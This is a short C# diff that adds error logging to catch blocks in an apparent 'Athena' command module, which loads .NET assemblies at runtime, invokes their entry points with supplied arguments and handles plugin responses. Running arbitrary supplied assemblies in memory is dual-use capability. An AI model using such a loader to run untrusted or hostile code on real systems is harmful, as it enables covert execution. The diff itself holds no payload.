@@ -1,5 +1,6 @@
 ﻿using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
+using Athena.Utilities;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -22,7 +23,7 @@ namespace Athena.Commands
             }
             catch (Exception e)
             {
-                //Return false if failure
+                Misc.WriteError(e.Message);
                 return "Failed to load Assembly!" + Environment.NewLine + e.Message;
             }
         }
@@ -35,8 +36,9 @@ namespace Athena.Commands
                 assembly.EntryPoint.Invoke(null, new object[] { Utilities.Misc.SplitCommandLine(args) });
                 return true;
             }
-            catch
+            catch (Exception e)
             {
+                Misc.WriteError(e.Message);
                 return false;
             }
         }
@@ -52,6 +54,7 @@ namespace Athena.Commands
             }
             catch (Exception e)
             {
+                Misc.WriteError(e.Message);
                 return "Failed to clear AssemblyLoadContext!" + Environment.NewLine + e.Message;
             }
         }
@@ -64,6 +67,7 @@ namespace Athena.Commands
             }
             catch (Exception e)
             {
+                Misc.WriteError(e.Message);
                 return "Failed to load Command!" + Environment.NewLine + e.Message;
             }
         }
@@ -84,6 +88,7 @@ namespace Athena.Commands
             }
             catch (Exception e)
             {
+                Misc.WriteError(e.Message);
                 return new PluginResponse()
                 {
                     output = e.Message,
